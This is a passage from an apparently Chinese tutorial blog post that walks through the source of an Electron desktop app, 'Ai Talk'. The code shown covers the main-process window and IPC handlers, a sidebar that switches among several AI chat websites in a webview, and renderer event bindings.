重载页面应用更改</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;代理已清除，恢复默认设置&#x27;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;清除代理失败:&#x27;</span>, err);</span><br><span class="line">      <span class="comment">// 可在此添加错误反馈到渲染进程</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>关于程序窗口 let versionWindow</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建显示&quot;关于程序&quot;信息的模态窗口</span></span><br><span class="line"><span class="comment"> * 用于展示版本信息、版权声明、许可证等</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createVersionWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 创建关于窗口实例</span></span><br><span class="line">  versionWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="number">500</span>,        <span class="comment">// 窗口宽度（适配常见说明文档布局）</span></span><br><span class="line">    <span class="attr">height</span>: <span class="number">685</span>,       <span class="comment">// 窗口高度（容纳长文本和图片）</span></span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&#x27;assets/logo.ico&#x27;</span>,  <span class="comment">// 窗口图标（Windows/Linux 生效）</span></span><br><span class="line">    <span class="attr">parent</span>: mainWindow,<span class="comment">// 父窗口设置（实现模态对话框效果）</span></span><br><span class="line">    <span class="attr">modal</span>: <span class="literal">true</span>,       <span class="comment">// 模态窗口（阻止父窗口交互）</span></span><br><span class="line">    <span class="attr">show</span>: <span class="literal">false</span>,       <span class="comment">// 初始隐藏避免页面加载时闪烁</span></span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;preload.js&#x27;</span>) <span class="comment">// 预加载脚本路径</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 移除默认菜单栏（增强原生应用体验）</span></span><br><span class="line">  versionWindow.<span class="title function_">setMenu</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加载关于页面</span></span><br><span class="line">  versionWindow.<span class="title function_">loadFile</span>(</span><br><span class="line">    path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;about.html&#x27;</span>)</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 页面加载完成后显示窗口（确保内容渲染完成）</span></span><br><span class="line">  versionWindow.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    versionWindow.<span class="title function_">show</span>();</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 窗口关闭事件处理（内存管理）</span></span><br><span class="line">  versionWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    versionWindow = <span class="literal">null</span>;  <span class="comment">// 释放内存引用防止内存泄漏</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IPC 通信：监听打开&quot;关于程序&quot;窗口请求</span></span><br><span class="line"><span class="comment"> * 渲染进程调用方式：window.electron.ipcRenderer.invoke(&#x27;open-version-dialog&#x27;)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 监听渲染进程发送的请求来打开窗口</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;open-version-dialog&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">createVersionWindow</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><blockquote><p>Index.html 分析</p></blockquote><div class="highlight-wrap" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Ai Talk<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--  加载 index.html CSS 格式--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../css/style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 测边栏 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;sidebar&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- logo --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/logo.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Logo&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;app_name&quot;</span>&gt;</span>Ai Talk<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!-- 对话 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;dialogue&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;dialogue_text&quot;</span>&gt;</span></span><br><span class="line">          选择对话</span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;action_button&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/dialogue.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Logo&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!-- AI 模块 --&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ai_module&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;kimi&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/kimi.ico&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;kimi&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> 月之暗面 Kimi</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;deepseek&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/deepseek.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;DeepSeek&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> 深度求索 DeepSeek</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;doubao&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/doubao.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;doubao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> 字节 豆包</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;tyqw&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/tyqw.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;tyqw&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> 啊里 通义千问</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;openai&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/chatgpt.ico&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;OpenAI&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> OpenAI ChatGPT</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;google&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/google.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;google&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> Google Gemini</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;poe&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/poe.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;poe&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> Quora Poe</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;tenxun&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/tenxun.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;tenxun&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> 腾讯 元宝</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;icon-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;wxyy&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/wxyy.ico&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;wxyy&quot;</span> <span class="attr">class</span>=<span class="string">&quot;icon-img&quot;</span>&gt;</span> 百度 文心一言</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!-- 设置选项列表 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;settings-list&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;settings-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;home-btn&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/home.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Night Mode Icon&quot;</span>&gt;</span> 回到主页</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;settings-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;set-proxy-btn&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/network.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Language Icon&quot;</span>&gt;</span> 网络设置</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;settings-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;manual-btn&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/manual.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Settings Icon&quot;</span>&gt;</span> 用户手册</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;settings-item&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;version-btn&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../assets/version.svg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Version Icon&quot;</span>&gt;</span> 关于程序</span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 右边显示区域 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 使用webview加载，默认加载second.html页面 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">webview</span> <span class="attr">id</span>=<span class="string">&quot;webview&quot;</span> <span class="attr">src</span>=<span class="string">&quot;second.html&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100%; height: 100vh;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">webview</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--- 引入渲染进程文件 renderer.js--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/renderer.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><blockquote><p>renderer.js 分析</p></blockquote><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*********************** 渲染进程主逻辑 (renderer.js) ***********************/</span></span><br><span class="line"><span class="comment">/* 本文件功能：控制界面交互与 WebView 内容加载，通过预加载脚本与主进程通信 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------- WebView 元素获取 ---------------------*/</span></span><br><span class="line"><span class="comment">// 获取用于显示网页内容的 WebView 容器，在index.html中已引入该文件（需主进程启用 webviewTag）</span></span><br><span class="line"><span class="keyword">const</span> webview = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;webview&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------- 侧边栏模型切换功能 -------------------*/</span></span><br><span class="line"><span class="comment">// 功能说明：点击不同 AI 模型按钮时，切换 WebView 加载的目标 URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 获取所有 AI 模型按钮元素（每个按钮对应一个 AI 服务） */</span></span><br><span class="line"><span class="comment">// 月之暗面 Kimi 按钮，元素 kimi 对应，index.html 中的 &lt;button id=&quot;kimi&quot;&gt; 元素</span></span><br><span class="line"><span class="keyword">const</span> kimiButton = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;kimi&#x27;</span>);</span><br><span class="line"><span class="comment">// ...其他按钮定义（结构相同）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 为每个模型按钮绑定点击事件 */</span></span><br><span class="line"><span class="comment">// Kimi 按钮点击事件：用户点击index.html中的 kimi 元素，renderer.js 接收到信号，加载官方页面</span></span><br><span class="line">kimiButton.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  webview.<span class="title function_">setAttribute</span>(<span class="string">&#x27;src&#x27;</span>, <span class="string">&quot;https://kimi.moonshot.cn/&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...其他按钮事件监听逻辑（模式相同，加载对应服务 URL）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------- 侧边栏设置功能 -----------------------*/</span></span><br><span class="line"><span class="comment">// 功能说明：处理设置相关按钮的点击事件（主页/手册/代理/版本）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 获取设置按钮元素 */</span></span><br><span class="line"><span class="keyword">const</span> homeBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;home-btn&#x27;</span>);       <span class="comment">// 主页按钮</span></span><br><span class="line"><span class="keyword">const</span> setProxyBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;set-proxy-btn&#x27;</span>); <span class="comment">// 代理按钮</span></span><br><span class="line"><span class="keyword">const</span> manualBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;manual-btn&#x27;</span>);   <span class="comment">// 手册按钮</span></span><br><span class="line"><span class="keyword">const</span> versionBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;version-btn&#x27;</span>); <span class="comment">// 版本按钮</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 主页按钮点击事件：加载本地 second.html 页面 */</span></span><br><span class="line">homeBtn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  webview.<span class="property">src</span> = <span class="string">&#x27;second.html&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 用户手册按钮点击事件：加载本地 PDF 文件 */</span></span><br><span class="line">manualBtn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  webview.<span class="property">src</span> = <span class="string">&#x27;../../assets/Readme.pdf&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 代理设置按钮点击事件：通过预加载脚本与主进程通信 */</span></span><br><span class="line">setProxyBtn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 调用预加载脚本暴露的 openProxyDialog 方法</span></span><br><span class="line">  <span class="comment">// 通信流程：渲染进程 -&gt; preload.js -&gt; 主进程 ipcMain -&gt; 创建代理窗口</span></span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">electron</span>.<span class="title function_">openProxyDialog</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 版本信息按钮点击事件：通过预加载脚本与主进程通信 */</span></span><br><span class="line">versionBtn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 调用预加载脚本暴露的 openVersionDialog 